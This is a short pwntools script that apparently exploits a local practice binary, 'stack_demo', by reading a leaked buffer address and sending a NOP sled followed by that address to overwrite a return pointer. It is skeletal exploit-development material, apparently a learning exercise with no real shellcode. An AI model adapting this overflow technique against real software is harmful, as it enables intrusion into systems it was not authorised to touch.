from pwn import *

p = process('./stack_demo')
gdb.attach(p, gdbscript='')
buf_addr = int(p.readline().decode(), 16)

payload = b""
payload += b"\x90" * 16 #NOP opcode
payload += p64(buf_addr)

p.sendline(payload)

p.interactive()
